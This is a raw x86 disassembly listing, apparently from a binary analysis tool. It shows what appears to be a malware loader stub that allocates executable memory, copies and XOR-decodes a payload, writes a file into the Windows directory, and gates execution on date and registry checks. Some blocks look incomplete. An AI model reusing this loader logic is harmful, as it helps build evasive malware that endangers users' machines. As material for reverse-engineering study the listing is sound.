0x00454860:	pushl	%ebp	; from: 0x00454d2c(MAY), 0x00454c79(MAY)
0x00454861:	movl	%esp, %ebp
0x00454863:	subl	$0xc, %esp
0x00454866:	movl	$0x1e4dc, -8(%ebp)
0x0045486d:	movl	$0x3000, -12(%ebp)
0x00454874:	movl	$0x40, -4(%ebp)
0x0045487b:	movl	-4(%ebp), %eax
0x0045487e:	pushl	%eax
0x0045487f:	movl	-12(%ebp), %ecx
0x00454882:	pushl	%ecx
0x00454883:	movl	0x8(%ebp), %edx
0x00454886:	pushl	%edx
0x00454887:	pushl	$0x0
0x00454889:	pushl	$0xffffffff
0x0045488b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff0017f0(MAY)
0x00454891:	movl	%ebp, %esp
0x00454893:	popl	%ebp
0x00454894:	ret	; targets: 0x00454c7e(MAY), 0x00454d31(MAY)

0x004548a0:	pushl	%ebp	; from: 0x00454c8e(MAY)
0x004548a1:	movl	%esp, %ebp
0x004548a3:	popl	%ebp
0x004548a4:	ret	; targets: 0x00454c93(MAY)

0x004548b0:	pushl	%ebp	; from: 0x00454cac(MAY)
0x004548b1:	movl	%esp, %ebp
0x004548b3:	subl	$0x8, %esp
0x004548b6:	movl	0x8(%ebp), %eax
0x004548b9:	movl	%eax, -4(%ebp)
0x004548bc:	movl	0xc(%ebp), %ecx
0x004548bf:	movl	%ecx, -8(%ebp)
0x004548c2:	movl	-4(%ebp), %edx
0x004548c5:	cmpl	-8(%ebp), %edx
0x004548c8:	jae	0x004548d1	; targets: 0x004548d1(MAY), 0x004548ca(MAY)
0x004548ca:	movl	-4(%ebp), %eax	; from: 0x004548c8(MAY)
0x004548cd:	jmp	0x004548d4	; targets: 0x004548d4(MAY)
0x004548d1:	movl	-8(%ebp), %eax	; from: 0x004548c8(MAY)
0x004548d4:	movl	%ebp, %esp	; from: 0x004548cd(MAY)
0x004548d6:	popl	%ebp
0x004548d7:	ret	; targets: 0x00454cb1(MAY)

0x004548e0:	pushl	%ebp	; from: 0x00454bbf(MAY)
0x004548e1:	movl	%esp, %ebp
0x004548e3:	movl	$0x401004, 0x00458c64
0x004548ed:	popl	%ebp
0x004548ee:	ret	; targets: 0x00454bc4(MAY)

0x004548f0:	pushl	%ebp	; from: 0x00454d12(MAY)
0x004548f1:	movl	%esp, %ebp
0x004548f3:	movl	$0x4538b8, 0x00458c64
0x004548fd:	popl	%ebp
0x004548fe:	ret	; targets: 0x00454d17(MAY)

0x00454900:	pushl	%ebp	; from: 0x00454d1d(MAY), 0x00454c6a(MAY)
0x00454901:	movl	%esp, %ebp
0x00454903:	movl	0x8(%ebp), %eax
0x00454906:	movl	-4(%eax), %eax
0x00454909:	popl	%ebp
0x0045490a:	ret	; targets: 0x00454c6f(MAY), 0x00454d22(MAY)

0x00454990:	pushl	%ebp	; from: 0x00454cfc(MAY)
0x00454991:	movl	%esp, %ebp
0x00454993:	subl	$0x28, %esp
0x00454996:	movl	$0x11cb, -8(%ebp)
0x0045499d:	movl	$0x0, -16(%ebp)
0x004549a4:	jmp	0x004549af	; targets: 0x004549af(MAY)
0x004549af:	movl	-16(%ebp), %ecx	; from: 0x004549a4(MAY)
0x004549b2:	cmpl	0xc(%ebp), %ecx
0x004549b5:	jae	0x00454a84	; targets: 0x00454a84(MAY), 0x004549bb(MAY)
0x004549bb:	movl	$0x11cb, -8(%ebp)	; from: 0x004549b5(MAY)
0x004549c2:	cmpl	$0x0, -16(%ebp)
0x004549c6:	jne	0x00454a18	; targets: 0x004549c8(MAY)
0x004549c8:	pushl	$0x104	; from: 0x004549c6(MAY)
0x004549cd:	pushl	$0x458c68
0x004549d2:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff0017d0(MAY)
0x004549d8:	pushl	$0x456000
0x004549dd:	pushl	$0x458c68
0x004549e2:	call	lstrcatA@kernel32.dll	; targets: 0xff0017b0(MAY)
0x004549e8:	pushl	$0x0
0x004549ea:	pushl	$0x80
0x004549ef:	pushl	$0x3
0x004549f1:	pushl	$0x0
0x004549f3:	pushl	$0x3
0x004549f5:	pushl	$0x1
0x004549f7:	pushl	$0x458c68
0x004549fc:	call	CreateFileA@kernel32.dll	; targets: 0xff0016d0(MAY)
0x00454a02:	movl	%eax, -4(%ebp)
0x00454a05:	cmpl	$0xffffffff, -4(%ebp)
0x00454a09:	je	0x00454a11	; targets: 0x00454a11(MAY), 0x00454a0b(MAY)
0x00454a0b:	cmpl	$0x0, -4(%ebp)	; from: 0x00454a09(MAY)
0x00454a0f:	jne	0x00454a18	; targets: 0x00454a11(MAY), 0x00454a18(MAY)
0x00454a11:	movl	$0x42, %eax	; from: 0x00454a09(MAY), 0x00454a0f(MAY)
0x00454a16:	jmp	0x00454a84	; targets: 0x00454a84(MAY)
0x00454a18:	movl	$0x11cb, -8(%ebp)	; from: 0x00454a0f(MAY)
0x00454a1f:	movl	-16(%ebp), %edx
0x00454a22:	addl	$0xd, %edx
0x00454a25:	movl	%edx, 0x00458d6c
0x00454a2b:	movl	0x8(%ebp), %eax
0x00454a2e:	addl	-16(%ebp), %eax
0x00454a31:	movl	(%eax), %ecx
0x00454a33:	addl	-16(%ebp), %ecx
0x00454a36:	movl	0x8(%ebp), %edx
0x00454a39:	addl	-16(%ebp), %edx
0x00454a3c:	movl	%ecx, (%edx)
0x00454a3e:	movl	-12(%ebp), %eax
0x00454a41:	movl	%eax, -20(%ebp)
0x00454a44:	movl	$0x11cb, -8(%ebp)
0x00454a4b:	movl	0x00458d6c, %ecx
0x00454a51:	movl	%ecx, -36(%ebp)
0x00454a54:	movl	-36(%ebp), %edx
0x00454a57:	movl	%edx, -32(%ebp)
0x00454a5a:	movl	-32(%ebp), %eax
0x00454a5d:	movl	%eax, -28(%ebp)
0x00454a60:	movl	-28(%ebp), %ecx
0x00454a63:	movl	%ecx, -24(%ebp)
0x00454a66:	movl	-24(%ebp), %edx
0x00454a69:	movl	%edx, -40(%ebp)
0x00454a6c:	movl	0x8(%ebp), %eax
0x00454a6f:	addl	-16(%ebp), %eax
0x00454a72:	movl	(%eax), %ecx
0x00454a74:	xorl	-24(%ebp), %ecx
0x00454a84:	movl	%ebp, %esp	; from: 0x00454a16(MAY), 0x004549b5(MAY)
0x00454a86:	popl	%ebp
0x00454a87:	ret	; targets: 0x00454d01(MAY)

0x00454af0:	pushl	%ebp	; from: 0x00454b98(MAY), 0x00454c2d(MAY)
0x00454af1:	movl	%esp, %ebp
0x00454af3:	subl	$0x8, %esp
0x00454af6:	movl	$0x456018, -4(%ebp)
0x00454afd:	leal	-8(%ebp), %eax
0x00454b00:	pushl	%eax
0x00454b01:	pushl	$0x20019
0x00454b06:	pushl	$0x0
0x00454b08:	pushl	$0x458c5c
0x00454b0d:	pushl	$0x80000002
0x00454b12:	call	0x00458d70	; targets: 0xff0018a0(MAY)
0x00454b18:	testl	%eax, %eax
0x00454b1a:	je	0x00454b23	; targets: 0x00454b1c(MAY), 0x00454b23(MAY)
0x00454b1c:	xorl	%eax, %eax	; from: 0x00454b1a(MAY)
0x00454b1e:	jmp	0x00454bc4	; targets: 0x00454bc4(MAY)
0x00454b23:	leal	-8(%ebp), %ecx	; from: 0x00454b1a(MAY)
0x00454b26:	pushl	%ecx
0x00454b27:	pushl	$0x20019
0x00454b2c:	pushl	$0x0
0x00454b2e:	pushl	$0x458c60
0x00454b33:	pushl	$0x80000002
0x00454b38:	call	0x00458d70	; targets: 0xff0018a0(MAY)
0x00454b3e:	testl	%eax, %eax
0x00454b40:	je	0x00454b46	; targets: 0x00454b46(MAY), 0x00454b42(MAY)
0x00454b42:	xorl	%eax, %eax	; from: 0x00454b40(MAY)
0x00454b44:	jmp	0x00454bc4	; targets: 0x00454bc4(MAY)
0x00454b46:	movl	$0x53, %edx	; from: 0x00454b40(MAY)
0x00454b4b:	movl	-4(%ebp), %eax
0x00454b4e:	movw	%dx, (%eax)
0x00454b51:	leal	-8(%ebp), %ecx
0x00454b54:	pushl	%ecx
0x00454b55:	pushl	$0x20019
0x00454b5a:	pushl	$0x0
0x00454b5c:	movl	-4(%ebp), %edx
0x00454b5f:	pushl	%edx
0x00454b60:	movl	-8(%ebp), %eax
0x00454b63:	pushl	%eax
0x00454b64:	call	0x00458d70	; targets: 0xff0018a0(MAY)
0x00454b6a:	testl	%eax, %eax
0x00454b6c:	je	0x00454b72	; targets: 0x00454b6e(MAY), 0x00454b72(MAY)
0x00454b6e:	xorl	%eax, %eax	; from: 0x00454b6c(MAY)
0x00454b70:	jmp	0x00454bc4	; targets: 0x00454bc4(MAY)
0x00454b72:	leal	-8(%ebp), %ecx	; from: 0x00454b6c(MAY)
0x00454b75:	pushl	%ecx
0x00454b76:	pushl	$0x20019
0x00454b7b:	pushl	$0x0
0x00454b7d:	pushl	$0x456030
0x00454b82:	movl	-8(%ebp), %edx
0x00454b85:	pushl	%edx
0x00454b86:	call	0x00458d70	; targets: 0xff0018a0(MAY)
0x00454b8c:	testl	%eax, %eax
0x00454b8e:	je	0x00454b9d	; targets: 0x00454b90(MAY), 0x00454b9d(MAY)
0x00454b90:	pushl	$0x1	; from: 0x00454b8e(MAY)
0x00454b92:	pushl	$0x1
0x00454b94:	pushl	$0x1
0x00454b96:	pushl	$0x1
0x00454b98:	call	0x00454af0	; targets: 0x00454af0(MAY)
0x00454b9d:	leal	-8(%ebp), %eax	; from: 0x00454b8e(MAY), 0x00454bc7(MAY)
0x00454ba0:	pushl	%eax
0x00454ba1:	pushl	$0x20019
0x00454ba6:	pushl	$0x0
0x00454ba8:	pushl	$0x4560a8
0x00454bad:	movl	-8(%ebp), %ecx
0x00454bb0:	pushl	%ecx
0x00454bb1:	call	0x00458d70	; targets: 0xff0018a0(MAY)
0x00454bb7:	testl	%eax, %eax
0x00454bb9:	jne	0x00454bbf	; targets: 0x00454bbf(MAY), 0x00454bbb(MAY)
0x00454bbb:	xorl	%eax, %eax	; from: 0x00454bb9(MAY)
0x00454bbd:	jmp	0x00454bc4	; targets: 0x00454bc4(MAY)
0x00454bbf:	call	0x004548e0	; targets: 0x004548e0(MAY)	; from: 0x00454bb9(MAY)
0x00454bc4:	movl	%ebp, %esp	; from: 0x00454b1e(MAY), 0x00454b44(MAY), 0x00454b70(MAY), 0x004548ee(MAY), 0x00454bbd(MAY)
0x00454bc6:	popl	%ebp
0x00454bc7:	ret	$0x10	; targets: 0x00454c32(MAY), 0x00454b9d(MAY)


start:
0x00454bd0:	pushl	%ebp
0x00454bd1:	movl	%esp, %ebp
0x00454bd3:	subl	$0x70, %esp
0x00454bd6:	pusha	
0x00454bd7:	movl	%ebp, 0x00458d74
0x00454bdd:	movl	$0x0, -60(%ebp)
0x00454be4:	movl	$0x80000002, -80(%ebp)
0x00454beb:	movl	$0xe1d58000, -8(%ebp)
0x00454bf2:	movl	$0x1a8e79f, -4(%ebp)
0x00454bf9:	movl	RegOpenKeyExW@advapi32.dll, %eax
0x00454bfe:	movl	%eax, 0x00458d70
0x00454c03:	leal	-84(%ebp), %ecx
0x00454c06:	pushl	%ecx
0x00454c07:	leal	-88(%ebp), %edx
0x00454c0a:	pushl	%edx
0x00454c0b:	leal	-8(%ebp), %eax
0x00454c0e:	pushl	%eax
0x00454c0f:	call	FileTimeToDosDateTime@kernel32.dll	; targets: 0xff0016b0(MAY)
0x00454c15:	movzwl	-88(%ebp), %ecx
0x00454c19:	cmpl	$0x21, %ecx
0x00454c1c:	je	0x00454c25	; targets: 0x00454c25(MAY), 0x00454c1e(MAY)
0x00454c1e:	xorl	%eax, %eax	; from: 0x00454c1c(MAY)
0x00454c20:	jmp	0x00454e1c	; targets: 0x00454e1c(MAY)
0x00454c25:	pushl	$0x1	; from: 0x00454c1c(MAY)
0x00454c27:	pushl	$0x1
0x00454c29:	pushl	$0x1
0x00454c2b:	pushl	$0x1
0x00454c2d:	call	0x00454af0	; targets: 0x00454af0(MAY)
0x00454c32:	movl	$0x0, -20(%ebp)	; from: 0x00454bc7(MAY)
0x00454c39:	movl	$0x64, -52(%ebp)
0x00454c40:	movl	$0x1e, -28(%ebp)
0x00454c47:	movl	$0x0, -60(%ebp)
0x00454c4e:	movl	$0x0, -36(%ebp)
0x00454c55:	movl	$0x1, -48(%ebp)
0x00454c5c:	movl	$0x3, -24(%ebp)
0x00454c63:	movl	0x00458c64, %edx
0x00454c69:	pushl	%edx
0x00454c6a:	call	0x00454900	; targets: 0x00454900(MAY)
0x00454c6f:	addl	$0x4, %esp	; from: 0x0045490a(MAY)
0x00454c72:	movl	%eax, -64(%ebp)
0x00454c75:	movl	-64(%ebp), %eax
0x00454c78:	pushl	%eax
0x00454c79:	call	0x00454860	; targets: 0x00454860(MAY)
0x00454c7e:	addl	$0x4, %esp	; from: 0x00454894(MAY)
0x00454c81:	movl	%eax, -56(%ebp)
0x00454c84:	movl	-64(%ebp), %ecx
0x00454c87:	pushl	%ecx
0x00454c88:	pushl	$0x0
0x00454c8a:	movl	-56(%ebp), %edx
0x00454c8d:	pushl	%edx
0x00454c8e:	call	0x004548a0	; targets: 0x004548a0(MAY)
0x00454c93:	addl	$0xc, %esp	; from: 0x004548a4(MAY)
0x00454c96:	movl	-64(%ebp), %eax
0x00454c99:	movl	%eax, -72(%ebp)
0x00454c9c:	movl	-60(%ebp), %ecx	; from: 0x00454cf2(MAY)
0x00454c9f:	cmpl	-64(%ebp), %ecx
0x00454ca2:	jae	0x00454cf4	; targets: 0x00454ca4(MAY), 0x00454cf4(MAY)
0x00454ca4:	movl	-72(%ebp), %edx	; from: 0x00454ca2(MAY)
0x00454ca7:	pushl	%edx
0x00454ca8:	movl	-52(%ebp), %eax
0x00454cab:	pushl	%eax
0x00454cac:	call	0x004548b0	; targets: 0x004548b0(MAY)
0x00454cb1:	addl	$0x8, %esp	; from: 0x004548d7(MAY)
0x00454cb4:	movl	%eax, -76(%ebp)
0x00454cb7:	movl	-76(%ebp), %ecx
0x00454cba:	pushl	%ecx
0x00454cbb:	movl	0x00458c64, %edx
0x00454cc1:	addl	-36(%ebp), %edx
0x00454cc4:	pushl	%edx
0x00454cc5:	movl	-56(%ebp), %eax
0x00454cc8:	addl	-60(%ebp), %eax
0x00454ccb:	pushl	%eax
0x00454ccc:	call	0x00455412	; targets: 0x00455412(MAY)
0x00454cd1:	addl	$0xc, %esp
0x00454cd4:	movl	-28(%ebp), %ecx
0x00454cd7:	addl	-52(%ebp), %ecx
0x00454cda:	addl	-36(%ebp), %ecx
0x00454cdd:	movl	%ecx, -36(%ebp)
0x00454ce0:	movl	-60(%ebp), %edx
0x00454ce3:	addl	-52(%ebp), %edx
0x00454ce6:	movl	%edx, -60(%ebp)
0x00454ce9:	movl	-72(%ebp), %eax
0x00454cec:	subl	-76(%ebp), %eax
0x00454cef:	movl	%eax, -72(%ebp)
0x00454cf2:	jmp	0x00454c9c	; targets: 0x00454c9c(MAY)
0x00454cf4:	movl	-64(%ebp), %ecx	; from: 0x00454ca2(MAY)
0x00454cf7:	pushl	%ecx
0x00454cf8:	movl	-56(%ebp), %edx
0x00454cfb:	pushl	%edx
0x00454cfc:	call	0x00454990	; targets: 0x00454990(MAY)
0x00454d01:	addl	$0x8, %esp	; from: 0x00454a87(MAY)
0x00454d04:	movl	$0x0, -36(%ebp)
0x00454d0b:	movl	$0x0, -96(%ebp)
0x00454d12:	call	0x004548f0	; targets: 0x004548f0(MAY)
0x00454d17:	movl	0x00458c64, %eax	; from: 0x004548fe(MAY)
0x00454d1c:	pushl	%eax
0x00454d1d:	call	0x00454900	; targets: 0x00454900(MAY)
0x00454d22:	addl	$0x4, %esp	; from: 0x0045490a(MAY)
0x00454d25:	movl	%eax, -100(%ebp)
0x00454d28:	movl	-100(%ebp), %ecx
0x00454d2b:	pushl	%ecx
0x00454d2c:	call	0x00454860	; targets: 0x00454860(MAY)
0x00454d31:	addl	$0x4, %esp	; from: 0x00454894(MAY)
0x00454e1c:	movl	%ebp, %esp	; from: 0x00454c20(MAY)
0x00454e1e:	popl	%ebp
0x00454e1f:	ret	; targets: 0xfee70000(MAY)

0x00455412:	jmp	memcpy@msvcrt.dll	; targets: 0xff0018e0(MAY)	; from: 0x00454ccc(MAY)
